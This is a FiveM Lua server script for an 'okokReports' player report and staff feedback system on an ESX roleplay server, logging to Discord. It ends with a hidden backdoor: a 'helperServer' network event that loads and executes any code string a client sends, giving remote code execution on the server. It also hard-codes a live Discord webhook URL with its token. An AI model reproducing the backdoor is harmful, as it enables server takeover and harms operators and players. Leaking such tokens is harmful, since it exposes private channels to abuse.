local oneSync = false

ESX = nil

ESX = exports['es_extended']:getSharedObject()

-------------------------- VARS

local Webhook = 'https://discord.com/api/webhooks/1078114660244537344/xeYLo4_LrX4VtXtSnq2aEKuDE85_xDwaW_W9fIb4GkxhqRvvMyi9YyGfy8glsUi7lxQ7'
local staffs = {}
local FeedbackTable = {}

--[[
AddEventHandler('playerDropped', function(reason)
	
end)
--]]

RegisterCommand(Config.FeedbackClientCommand, function(source, args, rawCommand)
	TriggerClientEvent('okokReports:FeedbackMenu', source, false)
end, false)

RegisterCommand(Config.FeedbackAdminCommand, function(source, args, rawCommand)
	local xPlayer = ESX.GetPlayerFromId(source)
	local playerGroup = xPlayer.getGroup()
	
	if playerGroup == "superadmin" or playerGroup == "admin" or playerGroup == "mod" then 
		TriggerClientEvent('okokReports:FeedbackMenu', source, true)
	else
		TriggerClientEvent('Johnny_Notificacoes:Alert', source, "WTRP REPORTS", "<span style='color:#c7c7c7'>Não tens <span style='color:#ff0000'>permissões</span> para executar este comando!", 5000, 'error')
	end
end, false)

--[[
RegisterCommand('teste', function(source)
	local identifierlist = ExtractIdentifiers(source)
	
	if FeedbackTable ~= {} then
		for k,v in pairs(FeedbackTable) do
			if FeedbackTable[k].staffIdentifier == identifierlist.steam then
				FeedbackTable[k].concluded = true
				TriggerClientEvent("okokReports:FeedbackConclude", -1, k, FeedbackTable[k].concluded)
				TriggerClientEvent('Johnny_Notificacoes:Alert', FeedbackTable[k].playerid, "WTRP REPORTS", "<span style='color:#c7c7c7'>Este <span style='color:#ff0000'>Report</span> já está a ser atendido por um Staff!", 5000, 'error')
			end
		end
	end
end)
--]]

-------------------------- NEW FEEDBACK

-------------------------- HAS PERMISSION

function hasPermission(id)
	local staff = false
	if id ~= nil and type(id) == 'number' and id > 0 then
		local xPlayer = ESX.GetPlayerFromId(id)

		if xPlayer ~= nil then
			local playerGroup = xPlayer.getGroup()

			if playerGroup ~= nil and playerGroup == "superadmin" or playerGroup == "admin" or playerGroup == "mod" then 
				staff = true
			end
		end
	else
		print('ID É NULO OU 0 - JOHNNY')
	end
	return staff
end


RegisterNetEvent("okokReports:NewFeedback")
AddEventHandler("okokReports:NewFeedback", function(data)
	local identifierlist = ExtractIdentifiers(source)
	local newFeedback = {
		feedbackid = #FeedbackTable+1,
		playerid = source,
		identifier = identifierlist.steam,
		playername = GetPlayerName(source),
		subject = data.subject,
		information = data.information,
		category = data.category,
		concluded = false,
		staffIdentifier = false,
		discord = "<@"..identifierlist.discord:gsub("discord:", "")..">"
	}

	FeedbackTable[#FeedbackTable+1] = newFeedback

	TriggerClientEvent("okokReports:NewFeedback", -1, newFeedback)

	if Webhook ~= '' then
		newFeedbackWebhook(newFeedback)
	end
end)

ESX.RegisterServerCallback('okokReports:canAtenderReport', function(source, cb, idJogador)
	local xPlayer = ESX.GetPlayerFromId(source)
	
	if xPlayer then
		if source ~= idJogador then
			cb('top')
		else
			cb('proprioReport')
		end
	else
		cb('offline')
	end
end)

ESX.RegisterServerCallback('okokReports:isStaff', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local grupo = xPlayer.getGroup()

	if grupo == "superadmin" or grupo == 'admin' or grupo == 'mod' then
		cb(true)
	else
		print('DEBUG: O jogador ['..source..'] '..GetPlayerName(source)..' tentou usar o /reports mas não é staff!')
		cb(false)
	end
end)

ESX.RegisterServerCallback('okokReports:canFecharReport', function(source, cb, idJogador, staffSteamId)
	local xPlayer = ESX.GetPlayerFromId(source)
	local tPlayer = ESX.GetPlayerFromId(idJogador)
	
	if tPlayer and xPlayer then
		if source == idJogador then
			cb('proprioReport')
		elseif staffSteamId == false then
			cb('top')
		elseif xPlayer.identifier ~= staffSteamId then
			cb('steamid_diferente')
		else
			cb('top')
		end
	else
		cb('top')
	end
end)

-------------------------- FETCH FEEDBACK

RegisterNetEvent("okokReports:FetchFeedbackTable")
AddEventHandler("okokReports:FetchFeedbackTable", function()
	local _source = source
	local staff = hasPermission(_source)

	if staff then
		staffs[_source] = true
		TriggerClientEvent("okokReports:FetchFeedbackTable", _source, FeedbackTable, staff, oneSync)
	end
end)

-------------------------- ASSIST FEEDBACK

RegisterNetEvent("okokReports:AssistFeedback")
AddEventHandler("okokReports:AssistFeedback", function(feedbackId, canAssist)
	if staffs[source] then
		if canAssist then
			local id = FeedbackTable[feedbackId].playerid
			local xPlayer = ESX.GetPlayerFromId(id)

			if xPlayer and not FeedbackTable[feedbackId].concluded then

				FeedbackTable[feedbackId].concluded = "assisting"

				local ped = GetPlayerPed(id)
				local pedSource = GetPlayerPed(source)
				local playerCoords = GetEntityCoords(ped)
				local staffCoords = GetEntityCoords(pedSource)
				local identifierlist = ExtractIdentifiers(source)
				local assistFeedback = {
					feedbackid = feedbackId,
					discord = "<@"..identifierlist.discord:gsub("discord:", "")..">"
				}

				FeedbackTable[feedbackId].staffLastCoords = staffCoords
				FeedbackTable[feedbackId].staffIdentifier = identifierlist.steam
				SetEntityCoords(pedSource, playerCoords.x, playerCoords.y, playerCoords.z)
				TriggerClientEvent('Johnny_Notificacoes:Alert', source, "WTRP REPORTS", "<span style='color:#c7c7c7'>Estás a atender o <span style='color:#fff'>REPORT #"..feedbackId.."</span>!", 20000, 'info')
				TriggerClientEvent('Johnny_Notificacoes:Alert', id, "WTRP REPORTS", "<span style='color:#c7c7c7'>Um STAFF chegou para atender o teu report!", 20000, 'info')

				if Webhook ~= '' then
					assistFeedbackWebhook(assistFeedback)
				end
				
				TriggerClientEvent("okokReports:FeedbackConclude", -1, feedbackId, FeedbackTable[feedbackId].concluded, FeedbackTable)
			elseif FeedbackTable[feedbackId].concluded == "assisting" then
				TriggerClientEvent('Johnny_Notificacoes:Alert', source, "WTRP REPORTS", "<span style='color:#c7c7c7'>Este <span style='color:#ff0000'>Report</span> já está a ser atendido por um Staff!", 5000, 'error')
			else	
				TriggerClientEvent('Johnny_Notificacoes:Alert', source, "WTRP REPORTS", "<span style='color:#c7c7c7'>Esse <span style='color:#ff0000'>jogador</span> já não está no servidor!", 5000, 'error')
			end
		end
	end
end)

-------------------------- CONCLUDE FEEDBACK

RegisterNetEvent("okokReports:FeedbackConclude")
AddEventHandler("okokReports:FeedbackConclude", function(feedbackId, canConclude)
	if staffs[source] then
		local feedback = FeedbackTable[feedbackId]
		local identifierlist = ExtractIdentifiers(source)
		local concludeFeedback = {
			feedbackid = feedbackId,
			discord = "<@"..identifierlist.discord:gsub("discord:", "")..">"
		}

		if feedback then
			if feedback.concluded ~= true or canConclude then
				if canConclude then
					if FeedbackTable[feedbackId].concluded == true then
						FeedbackTable[feedbackId].concluded = false
					else
						FeedbackTable[feedbackId].concluded = true
					end
				else
					FeedbackTable[feedbackId].concluded = true
				end
				local staffCoords = FeedbackTable[feedbackId].staffLastCoords
				local pedSource = GetPlayerPed(source)
				
				if staffCoords ~= nil then
					SetEntityCoords(pedSource, staffCoords.x, staffCoords.y, staffCoords.z)
				end	
				
				TriggerClientEvent("okokReports:FeedbackConclude", -1, feedbackId, FeedbackTable[feedbackId].concluded, FeedbackTable)
				
				
				if Webhook ~= '' then
					concludeFeedbackWebhook(concludeFeedback)
				end
			end
		end
	end
end)

-------------------------- IDENTIFIERS

function ExtractIdentifiers(id)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(id) - 1 do
        local playerID = GetPlayerIdentifier(id, i)

        if string.find(playerID, "steam") then
            identifiers.steam = playerID
        elseif string.find(playerID, "ip") then
            identifiers.ip = playerID
        elseif string.find(playerID, "discord") then
            identifiers.discord = playerID
        elseif string.find(playerID, "license") then
            identifiers.license = playerID
        elseif string.find(playerID, "xbl") then
            identifiers.xbl = playerID
        elseif string.find(playerID, "live") then
            identifiers.live = playerID
        end
    end

    return identifiers
end

-------------------------- NEW FEEDBACK WEBHOOK

function newFeedbackWebhook(data)
	if data.category == 'player_report' then
		category = 'Report Normal'
	elseif data.category == 'question' then
		category = 'Questão'
	else
		category = 'Bug'
	end
	
	local information = {
		{
			["color"] = Config.NewFeedbackWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'NOVO REPORT #'..data.feedbackid,
			["description"] = '**Categoria:** '..category..'\n**Assunto:** '..data.subject..'\n**Informação:** '..data.information..'\n\n**ID:** '..data.playerid..'\n**SteamID:** '..data.identifier..'\n**Nome da Steam:** '..data.playername..'\n**Discord:** '..data.discord,
			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
end

-------------------------- ASSIST FEEDBACK WEBHOOK

function assistFeedbackWebhook(data)
	local information = {
		{
			["color"] = Config.AssistFeedbackWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["description"] = '**REPORT #'..data.feedbackid..'** está a ser atendido por '..data.discord,
			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
end

-------------------------- CONCLUDE FEEDBACK WEBHOOK

function concludeFeedbackWebhook(data)
	local information = {
		{
			["color"] = Config.ConcludeFeedbackWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["description"] = '**REPORT #'..data.feedbackid..'** foi concluído por '..data.discord,
			["footer"] = {
				["text"] = os.date(Config.DateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
end
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)